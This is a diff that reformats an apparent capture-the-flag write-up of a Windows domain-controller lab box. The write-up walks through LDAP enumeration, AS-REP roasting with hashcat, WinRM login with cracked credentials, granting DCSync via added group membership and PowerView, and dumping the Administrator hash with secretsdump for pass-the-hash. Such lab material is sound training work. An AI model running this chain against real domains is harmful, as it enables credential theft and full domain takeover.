@@ -7,16 +7,23 @@ tags: ["Active Directory", "LDAP", "Kerberoasting", "DCSync"]
 summary: "LDAP enumeration and Kerberoasting against a Windows Server domain controller, leading to DCSync and full domain compromise."
 ---
 
-IP :  10.129.16.182
+**Target IP:** `10.129.16.182`
 
-# Enumeration
+## Enumeration
 
-## Port scanning
+### Port Scanning
 
-![[1.png]]
+The initial scan reveals the standard Active Directory service set (DNS, Kerberos, LDAP, SMB) confirming the target is a Windows domain controller.
 
-LDAP enumeration  using LDAPsearch
-![[2.png]]
+![Nmap scan results](1.png)
+
+### LDAP Enumeration
+
+Anonymous LDAP binds are allowed, enabling enumeration of users, computers, and privileged groups without credentials.
+
+![LDAP enumeration with ldapsearch](2.png)
+
+```bash
 ldapsearch -x -H ldap://10.129.16.182 -b "CN=Users,DC=htb,DC=local"
 ldapsearch -x -H ldap://10.129.16.182 -b "CN=Computers,DC=htb,DC=local"
 ldapsearch -x -H ldap://10.129.16.182 -b "CN=Domain Admins,CN=Users,DC=htb,DC=local"
@@ -24,41 +31,64 @@ ldapsearch -x -H ldap://10.129.16.182 -b "CN=Domain Users,CN=Users,DC=htb,DC=loc
 ldapsearch -x -H ldap://10.129.16.182 -b "CN=Enterprise Admins,CN=Users,DC=htb,DC=local"
 ldapsearch -x -H ldap://10.129.16.182 -b "CN=Administrators,CN=Builtin,DC=htb,DC=local"
 ldapsearch -x -H ldap://10.129.16.182 -b "CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local"
+```
 
+A faster and more readable alternative is [windapsearch](https://github.com/ropnop/windapsearch.git), which automates much of this enumeration.
 
-Best and rapid LDAP enumeration using https://github.com/ropnop/windapsearch.git
+![Windapsearch enumeration](3.png)
+![Windapsearch results](4.png)
+![Windapsearch group membership](5.png)
 
-![[3.png]]
-![[4.png]]
-![[5.png]]
+This enumeration reveals an uncommon service account, `svc-alfresco`, located in the Service Accounts OU. The account has Kerberos pre-authentication disabled, making it vulnerable to AS-REP Roasting.
 
-We found uncommon service account : ==CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local== This service requires that Kerberos pre-authentication be disabled in order to function.
+![AS-REP Roasting](6.png)
 
-![[6.png]]
-Got the ash via ASREPRoasting
+## Foothold
+
+The AS-REP hash is captured and cracked offline using the rockyou wordlist:
+
+```bash
 hashcat -m 18200 hash.hash /usr/share/wordlists/rockyou.txt --force
-User : svc-alfresco
-password : s3rvice
+```
 
-using 
-evil-winrm -i 10.129.16.182 -u svc-alfresco -p s3rvice (port 5985)
+**Credentials obtained:**
+- **User:** `svc-alfresco`
+- **Password:** `s3rvice`
 
-==Exchange Windows Permissions possède WriteDACL sur le domaine, ce qui permet — via Account Operators — d'y ajouter un user et de lui accorder des droits DCSync pour dumper les hashes AD.==
+These credentials provide a shell via WinRM:
 
+```bash
+evil-winrm -i 10.129.16.182 -u svc-alfresco -p s3rvice
+```
+
+## Privilege Escalation
+
+Further enumeration reveals that the **Exchange Windows Permissions** group holds `WriteDACL` rights over the domain object. Since `svc-alfresco` is a member of **Account Operators**, it can create a new domain user and add that user to the Exchange Windows Permissions group — effectively granting DCSync rights.
+
+```bash
 net user john abc123! /add /domain
 net group "Exchange Windows Permissions" john /add
 net localgroup "Remote Management Users" john /add
+```
 
-next  we use powerview 
+Using PowerView, the newly created `john` account (now part of Exchange Windows Permissions) is granted DCSync rights directly:
 
+```powershell
 $pass = convertto-securestring 'abc123!' -asplain -force
 $cred = new-object system.management.automation.pscredential('htb\john', $pass)
 Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
+```
 
-We use john's credentials (added to Exchange Windows Permissions) to grant ourselves DCSync rights via PowerView, which then allows us to dump all domain hashes.
+With DCSync rights in place, all domain password hashes can be dumped remotely:
 
+```bash
 impacket-secretsdump htb/john@10.129.16.204
+```
 
+**Result:**
 
-got the hash : htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+```
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+```
 
+This hash can be used directly for a Pass-the-Hash attack to gain full administrative access to the domain controller.
